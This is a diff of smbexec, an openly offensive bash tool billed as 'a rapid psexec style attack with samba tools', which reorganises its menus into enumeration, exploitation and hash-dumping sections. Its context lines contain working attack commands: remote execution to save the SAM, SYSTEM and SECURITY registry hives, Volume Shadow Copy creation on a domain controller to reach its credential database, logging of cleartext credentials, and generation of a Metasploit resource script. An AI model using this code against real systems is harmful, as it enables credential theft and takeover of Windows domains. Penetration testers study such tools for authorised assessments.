@@ -22,7 +22,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 01/19/2013 v1.2.2.1
+# Last update - 01/20/2013 v1.2.3
 #############################################################################################
 
 # Check to see if X is running
@@ -203,7 +203,7 @@ f_vanish(){
 		echo "set ExitOnSession false" >> $rc
 		echo "set InitialAutoRunScript migrate -f" >> $rc
 		echo "exploit -j -z" >> $rc
-		if [ "$mainchoice" == "5" ]; then
+		if [ "$sysexpchoice" == "3" ]; then
 			echo -e "\n\e[1;33mPayload and Resource file successfully created...\e[0m"
 			sleep 3
 			f_mainmenu
@@ -292,7 +292,7 @@ f_vanish(){
 f_banner(){
 	clear
 	echo "************************************************************"
-	echo -e "		      \e[1;36msmbexec - v1.2.2.1\e[0m       "
+	echo -e "		      \e[1;36msmbexec - v1.2.3\e[0m       "
 	echo "	A rapid psexec style attack with samba tools              "
 	echo "      Original Concept and Script by Brav0Hax & Purehate    "
 	echo "              Codename - Mommy's Little Monster	          "
@@ -387,9 +387,9 @@ password=$(echo $j|cut -d "%" -f2)
 successful_login=$(cat /tmp/smbexec/credential.chk|grep "//$i")
 
 if [ -z "$successful_login" ]; then
-	if [ $mainchoice != "7" ]; then echo -e "\e[1;31m[-] Remote login failed to $i with credentials $username $password\e[0m"; fi
+	if [ $sysenumchoice != "4" ]; then echo -e "\e[1;31m[-] Remote login failed to $i with credentials $username $password\e[0m"; fi
 else
-	if [ $mainchoice != "7" ]; then echo -e "\e[1;32m[+] Remote login successful to $i with credentials $username $password \e[0m" | tee -a /tmp/smbexec/$i.successful.logins.tmp; fi
+	if [ $sysenumchoice != "4" ]; then echo -e "\e[1;32m[+] Remote login successful to $i with credentials $username $password \e[0m" | tee -a /tmp/smbexec/$i.successful.logins.tmp; fi
 	if [ ! -z $check_for_da ]; then
 		f_get_domain_admin_users
 		f_get_logged_in_users
@@ -481,7 +481,7 @@ for i in $(cat $RHOSTS); do
 		echo -e "\n\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
 	else
 		echo -e "\n\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
-		cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
+		cat /tmp/smbexec/connects.tmp | egrep -i '(error|failed:)'
 	fi
 
 	# Get successful IP addy for cleanup later
@@ -490,7 +490,7 @@ for i in $(cat $RHOSTS); do
 	# If no successful connection was made above this portion is skipped
 	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
 		echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
-		mkdir $logfldr/hashes/$i
+		if [ ! -d $logfldr/hashes/$i ]; then mkdir $logfldr/hashes/$i; fi
 		# Get the registry keys
 		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %WINDIR%\Temp\sam && reg.exe save HKLM\SYSTEM %WINDIR%\Temp\sys && reg.exe save HKLM\SECURITY %WINDIR%\Temp\sec" &> /dev/null
 		$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %WINDIR%" &> /tmp/smbexec/windir.info
@@ -639,7 +639,9 @@ fi
 
 f_createvss(){
 for i in $(cat $RHOSTS); do
-	mkdir $logfldr/hashes/DC
+	if [ ! -d $logfldr/hashes/DC ]; then
+		mkdir -p $logfldr/hashes/DC
+	fi
 	# Create a Volume Shadow Copy
 	echo -e "\n\e[1;33m[*]Attempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
 	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin create shadow /for=$ntdsdrive" &> /tmp/smbexec/vssdc.out
@@ -689,9 +691,6 @@ f_mainmenu
 f_finddcs(){
 if [ "$SMBDomain" != "." ]; then
 	x="com net org local"
-	echo > /tmp/smbexec/pdc.txt
-	echo > /tmp/smbexec/dcs.txt
-
 	for i in $x; do
 		dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
 		dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
@@ -853,17 +852,17 @@ f_smbauth(){
 	fi
 
 	# If a domain account is being used, ask for the domain name if not included in SMBUser
-	if [ "$mainchoice" == "2" ]; then 
+	if [ "$sysexpchoice" == "2" ]; then 
 		if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
 			SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
 			SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
 		else
 			while [ -z $SMBDomain ]; do read -e -p " Please provide the Domain for the user account specified : " SMBDomain; done
 		fi
-	elif [ "$mainchoice" == "4" ]; then # Check for domain for host share list option
+	elif [ "$sysenumchoice" == "2" ]; then # Check for domain for host share list option
 		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
-	elif [ "$mainchoice" == "8" ]; then # Check for domain for host share list option
+	elif [ "$mainchoice" == "3" ]; then # Check for domain for host share list option
 		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
 		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
 	else
@@ -1092,10 +1091,55 @@ done
 
 }
 
-f_hashmenu(){
+f_system_enumeration_menu(){
 	clear
 	f_banner
+	echo -e "\e[1;37mSystem Enumeration Menu\e[0m"
+	echo "1. Create a host list"
+	echo "2. Enumerate Shares"
+	echo "3. Remote login validation"
+	echo "4. Check systems for Domain Admin"
+	echo "5. Main menu"
 
+	read -p "Choice : " sysenumchoice
+
+	case "$sysenumchoice" in
+		1) f_hosts ;;
+		2) f_enumshares ;;
+		3) f_smb_login ;;
+		4) f_da_sys_check ;;
+		5) f_mainmenu ;;
+		*) f_system_enumeration_menu ;;
+	esac
+
+}
+
+f_system_exploitation_menu(){
+	clear
+	f_banner
+	
+	echo -e "\e[1;37mSystem Exploitation Menu\e[0m"
+	echo "1. Local System Account"
+	echo "2. Domain Account"
+	echo "3. Create an executable and rc script"
+	echo "4. Main Menu"
+
+	read -p "Choice : " sysexpchoice
+
+	case "$sysexpchoice" in
+		1) f_vanish ;;
+		2) f_vanish ;;
+		3) f_vanish ;;
+		4) f_mainmenu ;;
+		*) f_hashmenu ;;
+	esac
+
+}
+
+f_obtain_hashes_menu(){
+	clear
+	f_banner
+	echo -e "\e[1;37mObtain Hashes Menu\e[0m"
 	echo "1. Workstation & Server Hashes (Local & DCC)"
 	echo "2. Domain Controller"
 	echo "3. Main Menu"
@@ -1116,29 +1160,19 @@ f_mainmenu(){
 	DATE=$(date +"%H%M")
 	clear
 	f_banner
-
-	echo "1. Local Account"
-	echo "2. Domain Account"
-	echo "3. Create a host list"
-	echo "4. Enumerate Shares"
-	echo "5. Create an executable and rc script"
-	echo "6. Remote Login Validation"
-	echo "7. Check systems for Domain Admin"
-	echo "8. Hash grab"
-	echo "9. Exit"
+	echo -e "\e[1;37mMain Menu\e[0m"
+	echo "1. System Enumeration"
+	echo "2. System Exploitation"
+	echo "3. Obtain Hashes"
+	echo "4. Exit"
 
 	read -p "Choice : " mainchoice
 
 	case "$mainchoice" in
-		1) f_vanish;;
-		2) f_vanish;;
-		3) f_hosts;;
-		4) f_enumshares;;
-		5) f_vanish;;
-		6) f_smb_login;;
-		7) f_da_sys_check;;
-		8) f_hashmenu;;
-		9) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
+		1) f_system_enumeration_menu;;
+		2) f_system_exploitation_menu;;
+		3) f_obtain_hashes_menu;;
+		4) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
 		   clear;f_freshstart;exit;;
 		1983) f_sd;;
 		*) f_mainmenu
